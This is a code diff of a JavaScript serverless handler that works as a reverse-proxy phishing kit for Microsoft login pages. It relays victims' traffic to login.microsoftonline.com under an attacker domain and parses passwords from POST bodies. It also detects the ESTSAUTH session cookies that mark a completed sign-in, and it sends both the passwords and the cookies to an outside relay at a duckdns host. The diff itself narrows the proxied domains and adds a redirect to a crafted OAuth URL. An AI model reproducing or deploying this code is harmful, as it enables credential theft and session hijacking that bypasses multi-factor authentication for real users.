@@ -5,21 +5,16 @@ const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
 const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
-// Simple domain list - just like the working Cloudflare script
+// Only proxy Microsoft login domains
 const PROXY_DOMAINS = [
   'login.microsoftonline.com',
   'login.live.com', 
   'account.live.com',
   'account.microsoft.com',
-  'aadcdn.msauth.net',
-  'www.office.com',
-  'office.com',
-  'microsoft365.com',
-  'outlook.office.com',
-  'outlook.live.com'
+  'aadcdn.msauth.net'
 ];
 
-// ==================== SIMPLE HELPER FUNCTIONS ====================
+// ==================== HELPER FUNCTIONS ====================
 
 async function sendToVercel(data, ip) {
   try {
@@ -49,39 +44,54 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== SIMPLE PROXY HANDLER ====================
+// ==================== MAIN HANDLER ====================
 
 export default async function handler(request) {
   const url = new URL(request.url);
   const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 'unknown';
   
-  // Block specific IPs
   if (BLOCKED_IPS.includes(ip)) {
     return new Response('Access denied.', { status: 403 });
   }
   
-  // === SIMPLE URL PARSING - NO QUERY PARAMETER MANIPULATION ===
-  let targetHost = 'login.microsoftonline.com';
+  // Handle root path - redirect directly to Microsoft login (bypass Office.com)
+  if (url.pathname === '/' || url.pathname === '') {
+    const redirectUrl = `https://${YOUR_DOMAIN}/_p/login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=RANDOM&ui_locales=en-US&mkt=en-US`;
+    
+    console.log(`[REDIRECT] Root -> Microsoft login`);
+    return new Response(null, {
+      status: 302,
+      headers: { 'Location': redirectUrl }
+    });
+  }
+  
+  // Extract domain from /_p/domain/path format
+  let targetHost = null;
   let targetPath = url.pathname;
   
-  // Check if this is a proxied request (starts with /_p/)
   if (url.pathname.startsWith('/_p/')) {
-    const parts = url.pathname.substring(4).split('/'); // Remove '/_p/' and split
+    const parts = url.pathname.substring(4).split('/');
     if (parts.length >= 1) {
-      targetHost = parts[0];
-      targetPath = '/' + parts.slice(1).join('/');
+      const potentialDomain = parts[0];
+      if (PROXY_DOMAINS.includes(potentialDomain)) {
+        targetHost = potentialDomain;
+        targetPath = '/' + parts.slice(1).join('/');
+      }
     }
   }
   
-  // Build target URL - PRESERVE ORIGINAL QUERY STRING WITHOUT MODIFICATION
+  if (!targetHost) {
+    return new Response('Not found', { status: 404 });
+  }
+  
+  // Build target URL - preserve original query string
   const targetUrl = `https://${targetHost}${targetPath}${url.search}`;
   
   console.log(`[PROXY] ${request.method} ${url.pathname} -> ${targetUrl}`);
   
-  // === BUILD REQUEST HEADERS ===
+  // Build request headers
   const headers = new Headers();
   
-  // Copy all headers except problematic ones
   for (const [key, value] of request.headers) {
     const lowerKey = key.toLowerCase();
     if (!['host', 'connection', 'content-length', 'content-encoding', 
@@ -90,17 +100,10 @@ export default async function handler(request) {
     }
   }
   
-  // Set correct Host header
   headers.set('Host', targetHost);
   
-  // Ensure Referer is set
-  if (!headers.has('Referer')) {
-    headers.set('Referer', `https://${targetHost}/`);
-  }
-  
-  // === HANDLE REQUEST BODY ===
+  // Handle request body
   let body = request.body;
-  let credentialsCaptured = false;
   
   if (request.method === 'POST') {
     try {
@@ -109,14 +112,8 @@ export default async function handler(request) {
       const { user, pass } = parseCredentials(bodyText);
       
       if (user && pass) {
-        console.log(`[CREDS] Captured: ${user.substring(0, 5)}...`);
-        credentialsCaptured = true;
-        await sendToVercel(`Credentials captured:\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`, ip);
-        
-        // Also send as file
-        const formData = new FormData();
-        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
-        await fetch(VERCEL_URL, { method: 'POST', body: formData });
+        console.log(`[CREDS] Captured: ${user}`);
+        await sendToVercel(`Credentials:\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`, ip);
       }
       
       body = bodyText;
@@ -126,7 +123,6 @@ export default async function handler(request) {
   }
   
   try {
-    // === FORWARD REQUEST TO UPSTREAM ===
     const response = await fetch(targetUrl, {
       method: request.method,
       headers: headers,
@@ -134,11 +130,11 @@ export default async function handler(request) {
       redirect: 'manual'
     });
     
-    // === HANDLE REDIRECTS ===
+    // Handle redirects
     if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
       let location = response.headers.get('Location');
       
-      // Rewrite location header to go through our proxy
+      // Rewrite redirects that go to domains we proxy
       for (const domain of PROXY_DOMAINS) {
         if (location.includes(domain)) {
           location = location.replace(new RegExp(`https?://${domain.replace(/\./g, '\\.')}`), `https://${YOUR_DOMAIN}/_p/${domain}`);
@@ -146,62 +142,34 @@ export default async function handler(request) {
         }
       }
       
-      // Handle relative redirects
-      if (location.startsWith('/')) {
-        location = `https://${YOUR_DOMAIN}/_p/${targetHost}${location}`;
-      }
-      
       console.log(`[REDIRECT] ${response.status} -> ${location}`);
-      
-      const redirectHeaders = new Headers();
-      redirectHeaders.set('Location', location);
-      redirectHeaders.set('Access-Control-Allow-Origin', '*');
-      redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
       
       return new Response(null, {
         status: response.status,
-        headers: redirectHeaders
+        headers: { 'Location': location }
       });
     }
     
-    // === PROCESS RESPONSE ===
+    // Process response
     const responseHeaders = new Headers();
     
-    // Copy all response headers
     for (const [key, value] of response.headers) {
       const lowerKey = key.toLowerCase();
       
-      // Handle Set-Cookie headers specially
       if (lowerKey === 'set-cookie') {
         let modifiedCookie = value;
-        
-        // Replace domain in cookie
         modifiedCookie = modifiedCookie.replace(
           new RegExp(targetHost.replace(/\./g, '\\.'), 'g'),
           YOUR_DOMAIN
         );
-        
-        // Also handle cookies with leading dot
-        modifiedCookie = modifiedCookie.replace(
-          new RegExp('\\.' + targetHost.replace(/\./g, '\\.'), 'g'),
-          '.' + YOUR_DOMAIN
-        );
-        
         responseHeaders.append('Set-Cookie', modifiedCookie);
       } 
-      // Skip security headers that might cause issues
-      else if (!['content-security-policy', 'content-security-policy-report-only', 'clear-site-data'].includes(lowerKey)) {
+      else if (!['content-security-policy', 'content-security-policy-report-only'].includes(lowerKey)) {
         responseHeaders.set(key, value);
       }
     }
     
-    // Add CORS headers
-    responseHeaders.set('Access-Control-Allow-Origin', '*');
-    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
-    responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    responseHeaders.set('Access-Control-Allow-Headers', 'Content-Type, Cookie, Set-Cookie');
-    
-    // === CHECK FOR AUTH COOKIES ===
+    // Check for auth cookies
     const setCookies = response.headers.getSetCookie();
     if (setCookies && setCookies.length) {
       const allCookies = setCookies.join('; ');
@@ -210,26 +178,16 @@ export default async function handler(request) {
       
       if (hasESTSAUTH && hasESTSAUTHPERSISTENT) {
         console.log(`[EXFIL] Complete session captured!`);
-        await sendToVercel(`Cookies captured:\n${allCookies}\nURL: ${url.href}`, ip);
-        
-        const formData = new FormData();
-        formData.append('file', new Blob([`IP: ${ip}\nURL: ${url.href}\n\n${allCookies}`], {type: 'text/plain'}), `${ip}-COOKIES.txt`);
-        await fetch(VERCEL_URL, { method: 'POST', body: formData });
+        await sendToVercel(`Cookies:\n${allCookies}\nURL: ${url.href}`, ip);
       }
     }
     
-    // === PROCESS RESPONSE BODY ===
+    // Process response body
     const contentType = response.headers.get('content-type') || '';
     
-    // For HTML/JS/CSS, replace domain references
-    if (contentType.includes('text/html') || 
-        contentType.includes('javascript') || 
-        contentType.includes('json') || 
-        contentType.includes('css')) {
-      
+    if (contentType.includes('text/html') || contentType.includes('javascript') || contentType.includes('json')) {
       let text = await response.text();
       
-      // Replace all proxy domains with our proxied URLs
       for (const domain of PROXY_DOMAINS) {
         const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
         text = text.replace(regex, `https://${YOUR_DOMAIN}/_p/${domain}`);
@@ -241,7 +199,6 @@ export default async function handler(request) {
       });
     }
     
-    // Return binary content as-is
     return new Response(response.body, {
       status: response.status,
       headers: responseHeaders
@@ -256,7 +213,6 @@ export default async function handler(request) {
   }
 }
 
-// Export for all HTTP methods
 export const GET = handler;
 export const POST = handler;
 export const PUT = handler;
